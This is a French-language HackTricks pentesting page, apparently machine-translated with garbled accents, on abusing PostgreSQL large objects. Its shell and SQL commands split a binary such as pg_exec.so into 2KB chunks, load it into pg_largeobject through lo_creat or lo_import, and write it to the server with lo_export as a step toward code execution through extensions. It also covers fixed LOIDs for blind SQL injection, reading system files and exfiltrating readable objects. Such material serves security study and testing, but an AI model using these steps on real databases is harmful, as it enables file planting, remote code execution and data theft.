# PostgreSQL Objets larges

PostgreSQL expose une structure appel√©e **objet large** (**table pg_largeobject**), qui est utilis√©e pour stocker des donn√©es qui seraient difficiles √† manipuler dans leur int√©gralit√© (comme une image ou un document PDF). Contrairement √† la fonction **COPY TO**, l'avantage des **objets larges** r√©side dans le fait que les **donn√©es** qu'ils **contiennent** peuvent √™tre **export√©es** vers le **syst√®me de fichiers** sous la forme d'une **copie identique du fichier import√©**.

Afin de **sauvegarder un fichier complet dans cette table**, vous devez d'abord **cr√©er un objet** dans la table mentionn√©e (identifi√© par un **LOID**) et ensuite **ins√©rer des morceaux de 2 Ko** dans cet objet. Il est tr√®s important que tous les **morceaux aient 2 Ko** (sauf √©ventuellement le dernier) **ou** la fonction d'**exportation** vers le syst√®me de fichiers **ne fonctionnera pas**.

Afin de **diviser** votre **binaire** en **morceaux** de **2 Ko**, vous pouvez faire :
```bash
split -b 2048 pg_exec.so #This will create files of size 2KB
```
Pour encoder chacun des fichiers cr√©√©s en Base64 ou en Hex, vous pouvez utiliser :
```bash
base64 -w 0 <Chunk_file> #Encoded in 1 line
xxd -ps -c 99999999999 <Chunk_file> #Encoded in 1 line
```
{% hint style="info" %}
Lors de l'exploitation de cette faille, il faut envoyer des **paquets de 2KB d'octets en texte clair** (pas 2KB d'octets encod√©s en base64 ou en hexad√©cimal). Si vous essayez d'automatiser cela, la taille d'un fichier **encod√© en hexad√©cimal** est **doubl√©e** (il faut donc envoyer 4KB de donn√©es encod√©es pour chaque paquet) et la taille d'un fichier **encod√© en base64** est `ceil(n / 3) * 4`.

De plus, pour d√©boguer le processus, vous pouvez voir le contenu des grands objets cr√©√©s avec :
{% endhint %}
```sql
 select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
# Utilisation de lo\_creat & Base64

Tout d'abord, nous devons cr√©er un LOID o√π les donn√©es binaires vont √™tre enregistr√©es :
```sql
SELECT lo_creat(-1);       -- returns OID of new, empty large object
SELECT lo_create(173454);   -- attempts to create large object with OID 43213
```
Si vous exploitez une **injection SQL aveugle**, vous serez plus int√©ress√© √† utiliser `lo_create` avec un **LOID fixe** afin de **savoir o√π** vous devez **t√©l√©verser** le **contenu**.\
Notez √©galement qu'il n'y a pas d'erreur de syntaxe, les fonctions sont `lo_creat` et `lo_create`.

LOID est utilis√© pour identifier l'objet dans la table `pg_largeobject`. L'insertion de morceaux de taille 2 Ko dans la table `pg_largeobject` peut √™tre r√©alis√©e en utilisant :
```sql
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 1, decode('<B64 chunk2>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 3, decode('<B64 chunk2>', 'base64'));
```
Enfin, vous pouvez exporter le fichier vers le syst√®me de fichiers en faisant (pendant cet exemple, le LOID utilis√© √©tait `173454`):
```sql
SELECT lo_export(173454, '/tmp/pg_exec.so');
```
{% hint style="info" %}
Notez que dans les versions les plus r√©centes de postgres, vous devrez peut-√™tre **t√©l√©charger les extensions sans indiquer aucun chemin**. [**Lisez ceci pour plus d'informations**.](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

Vous pourriez √™tre int√©ress√© par la suppression de l'objet volumineux cr√©√© apr√®s l'avoir export√© :
```sql
SELECT lo_unlink(173454);  -- deletes large object with OID 173454
```
# Utilisation de lo\_import & Hex

Dans ce sc√©nario, lo\_import va √™tre utilis√© pour cr√©er un objet de grande taille. Heureusement, dans ce cas, vous pouvez (et ne pouvez pas) sp√©cifier le LOID que vous souhaitez utiliser :
```sql
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts');
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts', 173454);
```
Apr√®s avoir cr√©√© l'objet, vous pouvez commencer √† ins√©rer les donn√©es sur chaque page (n'oubliez pas, vous devez ins√©rer des morceaux de 2 Ko):
```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=2;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=3;
```
Le HEX doit √™tre juste le hexad√©cimal (sans `0x` ou `\x`), exemple:
```sql
update pg_largeobject set data=decode('68656c6c6f', 'hex') where loid=173454 and pageno=0;
```
Enfin, exportez les donn√©es vers un fichier et supprimez l'objet volumineux :
```sql
 select lo_export(173454, 'C:\\path\to\pg_extension.dll');
 select lo_unlink(173454);  -- deletes large object with OID 173454
```
{% hint style="info" %}
Notez que dans les derni√®res versions de postgres, vous devrez peut-√™tre **t√©l√©charger les extensions sans indiquer aucun chemin**. [**Lisez ceci pour plus d'informations**](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions).
{% endhint %}

# Limitations

Apr√®s avoir lu la documentation sur les grands objets dans PostgreSQL, nous pouvons d√©couvrir que **les grands objets peuvent avoir une ACL** (Liste de contr√¥le d'acc√®s). Il est possible de configurer **de nouveaux grands objets** de sorte que votre utilisateur **n'ait pas suffisamment de privil√®ges** pour les lire m√™me s'ils ont √©t√© cr√©√©s par votre utilisateur.

Cependant, il peut y avoir **un ancien objet avec une ACL qui permet √† l'utilisateur actuel de le lire**, alors nous pouvons exfiltrer le contenu de cet objet. 


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
